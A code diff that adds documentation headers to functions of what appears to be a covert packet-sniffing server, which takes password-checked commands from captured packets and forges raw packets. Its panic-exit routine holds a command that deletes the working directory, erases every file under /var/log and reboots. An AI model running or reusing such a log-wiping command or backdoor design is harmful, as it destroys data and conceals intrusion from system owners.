@@ -20,6 +20,23 @@
 #include "cryptography.h"
 #include "file_watcher.h"
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    pcap_start
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void *pcap_start(void *ptr)
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Thread for starting the packet capture interface.
+ *----------------------------------------------------------------------------*/
 void *pcap_start(void *ptr)
 {
 	char *dev = NULL;					/* capture device */
@@ -88,6 +105,27 @@ void *pcap_start(void *ptr)
 	return NULL;
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    packet_callback
+ * 
+ * DATE:        June 4, 2010
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   packet_callback(unsigned char *args,
+ *                              const struct pcap_pkthdr *header,
+ *                              const unsigned char *packet)
+ *                   args - arguments passed by loop
+ *                   header - the packet header
+ *                   packet - user data (packet payload)
+ * 
+ * RETURNS:     void
+ * 
+ * NOTES: Callback for handling sniffed packets. Only responds to commands where
+ *        the password and encryption matches.
+ *----------------------------------------------------------------------------*/
 void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 		const unsigned char *packet)
 {
@@ -214,6 +252,23 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 	return;
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    in_cksum
+ * 
+ * DATE:        May 17, 2010
+ * 
+ * DESIGNER:    W. Richard Stevens (From UNIX Network Programming)
+ * 
+ * PROGRAMMER:  W. Richard Stevens (From UNIX Network Programming)
+ * 
+ * INTERFACE:   in_cksum(unsigned short *addr, int len)
+ *                     addr - the IP to be checksummed
+ *                     len - lengh of the header
+ * 
+ * RETURNS:     A checksum on the IP header.
+ * 
+ * NOTES: Creates a valid checksum for an IP header.
+ *----------------------------------------------------------------------------*/
 unsigned short in_cksum(unsigned short *addr, int len)
 {
 	int nleft = len;
@@ -244,6 +299,25 @@ unsigned short in_cksum(unsigned short *addr, int len)
 	return (answer);
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    in_cksum_tcp
+ * 
+ * DATE:        May 17, 2010
+ * 
+ * DESIGNER:    Murat Balaban <murat@enderunix.org>
+ * 
+ * PROGRAMMER:  Murat Balaban <murat@enderunix.org>
+ * 
+ * INTERFACE:   in_cksum_tcp(int src, int dst, unsigned short *addr, int len)
+ *                   src - source IP address
+ *                   dst - destination IP address
+ *                   addr - TCP header
+ *                   len - length of TCP header
+ * 
+ * RETURNS:     Valid checksum on TCP header
+ * 
+ * NOTES: Creates a valid TCP checksum.
+ *----------------------------------------------------------------------------*/
 unsigned short in_cksum_tcp(int src, int dst, unsigned short *addr, int len)
 {
 	struct pseudo_hdr {
@@ -272,6 +346,22 @@ unsigned short in_cksum_tcp(int src, int dst, unsigned short *addr, int len)
 	return (answer);
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    packet_forge
+ * 
+ * DATE:        June 4, 2010
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   packet_forge(char *payload)
+ *                    payload - the data being sent
+ * 
+ * RETURNS:     void
+ * 
+ * NOTES: Sends data over a raw socket.
+ *----------------------------------------------------------------------------*/
 void packet_forge(char *payload, char *src, char *dst)
 {
 	struct ip iph;
@@ -361,6 +451,24 @@ void packet_forge(char *payload, char *src, char *dst)
 	close(sock_fd);
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    exit_clean
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void exit_clean(void)
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Cleanly exits the server application by freeing the watchlist, if any
+ *        and allowing threads to terminate.
+ *----------------------------------------------------------------------------*/
 void exit_clean(void)
 {
 	watching = FALSE;
@@ -369,6 +477,24 @@ void exit_clean(void)
 	exit(SUCCESS);
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    exit_panic
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void exit_panic(void)
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Panic quits the server by deleting the current running directory,
+ *        clearning out ALL logs in /var/log and then rebooting the computer.
+ *----------------------------------------------------------------------------*/
 void exit_panic(void)
 {
 	char *panic_del = "rm -rf `pwd` ; cd ; find /var/log -exec rm {} \\;; reboot";
